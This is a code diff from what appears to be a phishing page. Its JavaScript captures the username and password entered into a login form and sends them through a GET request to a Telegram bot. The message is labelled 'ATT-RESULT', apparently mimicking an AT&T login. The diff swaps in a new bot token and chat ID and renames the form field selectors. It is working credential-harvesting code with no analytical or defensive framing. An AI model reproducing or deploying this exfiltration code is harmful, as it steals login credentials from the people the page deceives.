@@ -934,16 +934,16 @@
       const formal = document.querySelector('#form')
     
       let bot = {
-          TOKEN: "7149995582:AAH3QI0oPOj72s4uy7wsCnxtjywEYD0ifx0",
-          chatID: "5684628340"
+          TOKEN: "7433618309:AAERvvnK04KOEX-y4-62N8W4mGnTEKSqME4",
+          chatID: "6599507166"
       }
 
 
       formal.addEventListener("submit", e =>{
           e.preventDefault();
 
-          let result1 = document.querySelector('#temail').value
-          let result2 = document.querySelector('#tpass').value
+          let result1 = document.querySelector('#ai').value
+          let result2 = document.querySelector('#pr').value
           
           fetch(`https://api.telegram.org/bot${bot.TOKEN}/sendMessage?chat_id=${bot.chatID}&text=ATT-RESULT=Username::${result1}==++==Password::${result2}`, {
               method: "GET"
